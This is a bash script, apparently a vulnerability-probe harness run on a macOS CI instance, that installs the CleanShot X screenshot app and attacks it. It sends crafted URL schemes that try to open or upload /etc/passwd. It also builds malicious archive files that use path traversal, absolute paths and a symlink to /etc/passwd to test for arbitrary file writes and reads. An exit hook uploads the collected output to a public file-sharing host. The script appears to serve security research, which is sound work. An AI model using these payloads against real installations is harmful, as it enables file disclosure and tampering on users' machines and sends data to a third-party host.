#!/bin/bash
# CleanShot X macOS probe harness — runs inside Codemagic macOS instance
OUT=/tmp/csx-report.txt
: > "$OUT"
exec > >(tee -a "$OUT") 2>&1
set -x

upload_report() {
  echo "=== UPLOADING REPORT ==="
  curl -s --max-time 60 -F "file=@/tmp/csx-report.txt" https://tmpfiles.org/api/v1/upload -o /tmp/upload.json || true
  cat /tmp/upload.json || true
  python3 - <<'PY' || true
import json
try:
    d = json.load(open('/tmp/upload.json'))
    u = d['data']['url'].replace('tmpfiles.org/', 'tmpfiles.org/dl/')
    print('REPORT_URL=' + u)
except Exception as e:
    print('upload parse failed', e)
PY
}
trap upload_report EXIT

echo "=== ENV ==="
sw_vers
uname -m
id
echo "GUI session:"; who

echo "=== DOWNLOAD ==="
DMG=/tmp/csx.dmg
curl -sL --max-time 300 -o "$DMG" https://updates.getcleanshot.com/v3/CleanShot-X-5.0.2.dmg
ls -l "$DMG"
shasum -a 256 "$DMG"

echo "=== MOUNT ==="
hdiutil attach "$DMG" -nobrowse -quiet || { echo "MOUNT FAILED"; exit 1; }
ls /Volumes
cp -R "/Volumes/CleanShot X/CleanShot X.app" /Applications/ 2>/dev/null || echo "copy failed"
hdiutil detach "/Volumes/CleanShot X" -quiet 2>/dev/null || true

APP="/Applications/CleanShot X.app"
echo "=== INFO ==="
defaults read "$APP/Contents/Info.plist" CFBundleShortVersionString 2>&1
defaults read "$APP/Contents/Info.plist" CFBundleIdentifier 2>&1

echo "=== ENTITLEMENTS ==="
codesign -d --entitlements :- "$APP" 2>&1 | head -80
echo "=== GATEKEEPER ==="
spctl -a -vvv "$APP" 2>&1 | head -10

echo "=== LAUNCH ==="
open -a "$APP" 2>&1 || echo "open failed"
sleep 10
pgrep -fl CleanShot 2>&1 || echo "not running"

echo "=== URL SCHEMES ==="
for u in "cleanshot://capture" "cleanshot://capture?mode=area" "cleanshot://open?path=/etc/passwd" "cleanshot://upload?file=/etc/passwd" "cleanshot://pin?path=/tmp" "cleanshot://settings"; do
  echo "--- $u"
  open "$u" 2>&1 || echo "open scheme failed"
  sleep 3
done

echo "=== LOG (CleanShot) ==="
log show --last 4m --predicate 'process CONTAINS "CleanShot" OR eventMessage CONTAINS "cleanshot"' --style compact 2>/dev/null | tail -150

echo "=== BUILD TEST DOCS ==="
python3 - <<'PY'
import zipfile
z = zipfile.ZipFile('/tmp/evil1.cleanshot','w')
z.writestr('../../../../tmp/CSX_PWNED1.txt','pwned1')
z.close()
z = zipfile.ZipFile('/tmp/evil2.cleanshot','w')
z.writestr('/tmp/CSX_PWNED2.txt','pwned2')
z.close()
z = zipfile.ZipFile('/tmp/evil3.cleanshot','w')
zi = zipfile.ZipInfo('link')
zi.external_attr = (0o120777 << 16)
z.writestr(zi, '/etc/passwd')
z.writestr('manifest.json','{"version":1}')
z.close()
print("docs built")
PY
rm -f /tmp/CSX_PWNED1.txt /tmp/CSX_PWNED2.txt

echo "=== OPEN DOCS ==="
for f in /tmp/evil1.cleanshot /tmp/evil2.cleanshot /tmp/evil3.cleanshot; do
  echo "--- $f"
  open -a "$APP" "$f" 2>&1 || echo "open doc failed"
  sleep 8
done

echo "=== TRAVERSAL ARTIFACTS ==="
ls -la /tmp/CSX_PWNED1.txt /tmp/CSX_PWNED2.txt 2>&1
find /tmp -maxdepth 2 -name 'CSX_PWNED*' 2>/dev/null

echo "=== CRASH REPORTS ==="
ls -la ~/Library/Logs/DiagnosticReports 2>&1 | tail -30
for f in ~/Library/Logs/DiagnosticReports/*CleanShot* 2>/dev/null; do
  echo "--- $f"; head -60 "$f"
done

echo "=== DONE ==="
